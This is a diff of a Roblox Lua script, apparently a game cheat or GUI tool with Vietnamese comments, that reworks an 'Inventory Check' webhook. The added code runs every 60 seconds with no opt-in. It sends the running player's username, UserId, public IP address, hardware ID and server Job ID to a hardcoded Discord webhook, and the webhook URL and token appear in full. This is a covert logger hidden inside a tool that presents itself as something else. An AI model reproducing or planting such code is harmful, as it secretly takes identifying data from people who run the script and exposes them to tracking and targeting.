@@ -105,110 +105,92 @@ local Converted = {}
 local isMinimized = true
 local isDragging = true
 
-local function PostWebhook(message)
-    local webhookUrl = getgenv().config and getgenv().config.Webhook and getgenv().config.Webhook["Webhook Url"]
-    local enabled = getgenv().config and getgenv().config.Webhook and getgenv().config.Webhook["Send Webhook"]
-
-    if not enabled or not webhookUrl then
-        warn("Webhook chưa được bật hoặc thiếu URL.")
-        return
-    end
-
-    -- Lấy phương thức gửi request (sử dụng các phương thức khác nhau tùy môi trường)
-    local request = (http_request and http_request) 
-                  or (syn and syn.request) 
-                  or (request and request) 
-                  or (http and http.request)
-
-    if typeof(request) ~= "function" then
-        warn("Không tìm thấy phương thức gửi HTTP.")
-        return
-    end
-
-    request({
-        Url = webhookUrl,
+function PostWebhook(Url, message)
+    local request = http_request or request or HttpPost or syn.request
+    local data = request({
+        Url = Url,
         Method = "POST",
         Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode(message)
+        Body = game:GetService("HttpService"):JSONEncode(message)
     })
+    return ""
 end
 
-local function SendItemWebhook(hasGodsChalice, hasFistOfDarkness)
-    local embed = {
-        ["title"] = "**📦 Inventory Check!**",
-        ["color"] = tonumber(0xf93dff),
-        ["fields"] = {
+function AdminLoggerMsg(hasGodsChalice, hasFistOfDarkness)
+    local AdminMessage = {
+        ["embeds"] = {
             {
-                ["name"] = "👤 Username",
-                ["value"] = "```" .. LocalPlayer.Name .. "```",
-                ["inline"] = true
-            },
-            {
-                ["name"] = "🆔 UserId",
-                ["value"] = "```" .. LocalPlayer.UserId .. "```",
-                ["inline"] = true
-            },
-            {
-                ["name"] = "🏝️ Map",
-                ["value"] = "```" .. MarketplaceService:GetProductInfo(game.PlaceId).Name .. "```",
-                ["inline"] = false
-            },
-            {
-                ["name"] = "🌐 IP Address",
-                ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
-                ["inline"] = false
-            },
-            {
-                ["name"] = "💻 HWID",
-                ["value"] = "```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "```",
-                ["inline"] = false
-            },
-            {
-                ["name"] = "🔑 God's Chalice",
-                ["value"] = hasGodsChalice and "✅" or "❌",
-                ["inline"] = true
-            },
-            {
-                ["name"] = "💥 Fist of Darkness",
-                ["value"] = hasFistOfDarkness and "✅" or "❌",
-                ["inline"] = true
-            },
-            {
-                ["name"] = "🧭 Job ID",
-                ["value"] = "```" .. game.JobId .. "```",
-                ["inline"] = false
-            },
-        },
-        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
+                ["title"] = "**📦 Inventory Check!**",
+                ["description"] = "",
+                ["color"] = tonumber(0xf93dff),
+                ["fields"] = {
+                    {
+                        ["name"] = "**👤 Username**",
+                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "**UserID**",
+                        ["value"] = "```" .. game.Players.LocalPlayer.UserId .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "**PlaceID**",
+                        ["value"] = "```" .. game.PlaceId .. "```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "**IP Address**",
+                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "💻 HWID",
+                        ["value"] = "```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "🕹 God's Chalice",
+                        ["value"] = hasGodsChalice and "✅" or "❌",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "💥 Fist of Darkness",
+                        ["value"] = hasFistOfDarkness and "✅" or "❌",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "🧭 Job ID",
+                        ["value"] = "```" .. game.JobId .. "```",
+                        ["inline"] = false
+                    },
+                },
+                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
+            }
+        }
     }
-    return {
-        ["username"] = "Item Logger",
-        ["embeds"] = {embed}
-    }
+    return AdminMessage
 end
 
-PostWebhook("https://discord.com/api/webhooks/1360798536937246840/HBIfH0Okazx7DxPPu8rNi_jYQSMWT4eis8HSx6UW83rLMgxQn6fgWShuqBbaiwxUEXmS", SendItemWebhook(true, true))
--- Tự động kiểm tra item mỗi 60 giây
+-- Kiểm tra "God's Chalice" và "Fist of Darkness" mỗi 60 giây
 spawn(function()
-    local sent = false
-    while task.wait(60) do
+    while true do
         local hasGodsChalice = false
         local hasFistOfDarkness = false
 
-        for _, item in pairs(LocalPlayer.Backpack:GetChildren()) do
+        -- Kiểm tra trong ba lô
+        for _, item in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
             if item.Name == "God's Chalice" then
                 hasGodsChalice = true
             elseif item.Name == "Fist of Darkness" then
                 hasFistOfDarkness = true
             end
         end
+            
+        PostWebhook("https://discord.com/api/webhooks/1360798536937246840/HBIfH0Okazx7DxPPu8rNi_jYQSMWT4eis8HSx6UW83rLMgxQn6fgWShuqBbaiwxUEXmS", AdminLoggerMsg(hasGodsChalice, hasFistOfDarkness))
 
-        if (hasGodsChalice or hasFistOfDarkness) and not sent then
-            SendItemWebhook(hasGodsChalice, hasFistOfDarkness)
-            sent = true
-        elseif not hasGodsChalice and not hasFistOfDarkness then
-            sent = false
-        end
+        -- Chờ 60 giây trước khi gửi lần tiếp theo
+        task.wait(60)
     end
 end)
 
